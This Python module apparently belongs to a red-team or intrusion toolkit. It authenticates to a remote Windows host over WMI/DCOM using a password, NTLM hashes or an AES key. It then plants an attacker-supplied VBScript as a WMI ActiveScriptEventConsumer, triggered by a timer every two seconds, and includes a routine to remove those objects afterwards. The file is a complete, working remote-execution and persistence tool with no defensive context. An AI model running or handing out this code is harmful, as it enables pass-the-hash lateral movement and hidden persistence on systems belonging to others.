from module import *
from module import wmiconnect
from module import checkError
import os

def delete(ip='', username='', password='',domain='',hashes='',aesKey='',vbsname=''):
    print("[*] Removing ActiveScriptEventConsumer %s" % vbsname)
    dcom, iWbemLevel1Login = wmiconnect.wmiconnect(ip, username, password, domain, hashes, aesKey)
    iWbemServices = iWbemLevel1Login.NTLMLogin('//./root/subscription', NULL, NULL)
    iWbemLevel1Login.RemRelease()
    checkError.checkError('Removing ActiveScriptEventConsumer %s' % vbsname,
               iWbemServices.DeleteInstance('ActiveScriptEventConsumer.Name="%s"' % vbsname))

    print("[*] Removing EventFilter EF_%s" % vbsname)
    checkError.checkError('Removing EventFilter EF_%s' % vbsname,
               iWbemServices.DeleteInstance('__EventFilter.Name="EF_%s"' % vbsname))

    print("[*] Removing FilterToConsumerBinding %s" % vbsname)
    checkError.checkError('Removing IntervalTimerInstruction TI_%s' % vbsname,
               iWbemServices.DeleteInstance(
                   '__IntervalTimerInstruction.TimerId="TI_%s"' % vbsname))

    print("[+] DeleteInstance __FilterToConsumerBinding.Consumer=\"ActiveScriptEventConsumer.Name=\"%s\" and Filter=\"__EventFilter.Name=\"EF_%s\"",vbsname,vbsname)
    checkError.checkError('Removing FilterToConsumerBinding %s' % vbsname,
               iWbemServices.DeleteInstance(
                   r'__FilterToConsumerBinding.Consumer="ActiveScriptEventConsumer.Name=\"%s\"",'
                   r'Filter="__EventFilter.Name=\"EF_%s\""' % (
                       vbsname, vbsname)))

    dcom.disconnect()

def run_vbs(ip='', username='', password='',domain='',hashes='',aesKey='',vbsname='',vbsid=''):
    if os.path.exists(vbsname)==False:
        print("[-] not found vbs:{}".format(vbsname))
        exit()
    dcom, iWbemLevel1Login = wmiconnect.wmiconnect(ip, username, password, domain, hashes, aesKey)
    iWbemServices = iWbemLevel1Login.NTLMLogin('//./root/subscription', NULL, NULL)
    iWbemLevel1Login.RemRelease()
    '''
    if __options.action.upper() == 'REMOVE':
        checkError('Removing ActiveScriptEventConsumer %s' % vbsname,
                        iWbemServices.DeleteInstance('ActiveScriptEventConsumer.Name="%s"' % vbsname))

        checkError('Removing EventFilter EF_%s' % vbsname,
                        iWbemServices.DeleteInstance('__EventFilter.Name="EF_%s"' % vbsname))

        checkError('Removing IntervalTimerInstruction TI_%s' % vbsname,
                        iWbemServices.DeleteInstance(
                            '__IntervalTimerInstruction.TimerId="TI_%s"' % vbsname))

        checkError('Removing FilterToConsumerBinding %s' % vbsname,
                        iWbemServices.DeleteInstance(
                            r'__FilterToConsumerBinding.Consumer="ActiveScriptEventConsumer.Name=\"%s\"",'
                            r'Filter="__EventFilter.Name=\"EF_%s\""' % (
                                vbsname, vbsname)))
    else:
    '''
    print("[*] reading vbs:{}".format(vbsname))
    vbsdata=open(vbsname,"r",encoding="utf-8").read()
    print("[*] Adding ActiveScriptEventConsume")
    if vbsid=='':
        vbsname="Example"
    else:
        vbsname=vbsid
    activeScript, _ = iWbemServices.GetObject('ActiveScriptEventConsumer')
    activeScript = activeScript.SpawnInstance()
    activeScript.Name = vbsname
    activeScript.ScriptingEngine = 'VBScript'
    activeScript.CreatorSID = [1, 2, 0, 0, 0, 0, 0, 5, 32, 0, 0, 0, 32, 2, 0, 0]
    activeScript.ScriptText = vbsdata
    checkError.checkError('Adding ActiveScriptEventConsumer %s' % vbsname,
                        iWbemServices.PutInstance(activeScript.marshalMe()))


    print("[*] Adding IntervalTimerInstruction")
    wmiTimer, _ = iWbemServices.GetObject('__IntervalTimerInstruction')
    wmiTimer = wmiTimer.SpawnInstance()
    wmiTimer.TimerId = 'TI_%s' % vbsname
    wmiTimer.IntervalBetweenEvents = int(2000)
    # wmiTimer.SkipIfPassed = False
    checkError.checkError('Adding IntervalTimerInstruction',
                        iWbemServices.PutInstance(wmiTimer.marshalMe()))

    print("[*] Adding EventFilter EF_%s"% vbsname)
    eventFilter, _ = iWbemServices.GetObject('__EventFilter')
    eventFilter = eventFilter.SpawnInstance()
    eventFilter.Name = 'EF_%s' % vbsname
    eventFilter.CreatorSID = [1, 2, 0, 0, 0, 0, 0, 5, 32, 0, 0, 0, 32, 2, 0, 0]
    eventFilter.Query = 'select * from __TimerEvent where TimerID = "TI_%s" ' % vbsname
    eventFilter.QueryLanguage = 'WQL'
    eventFilter.EventNamespace = r'root\subscription'
    checkError.checkError('Adding EventFilter EF_%s' % vbsname,
                        iWbemServices.PutInstance(eventFilter.marshalMe()))

    print("[+] Adding FilterToConsumerBinding")
    filterBinding, _ = iWbemServices.GetObject('__FilterToConsumerBinding')
    filterBinding = filterBinding.SpawnInstance()
    filterBinding.Filter = '__EventFilter.Name="EF_%s"' % vbsname
    filterBinding.Consumer = 'ActiveScriptEventConsumer.Name="%s"' % vbsname
    filterBinding.CreatorSID = [1, 2, 0, 0, 0, 0, 0, 5, 32, 0, 0, 0, 32, 2, 0, 0]

    checkError.checkError('Adding FilterToConsumerBinding',
                    iWbemServices.PutInstance(filterBinding.marshalMe()))

    dcom.disconnect()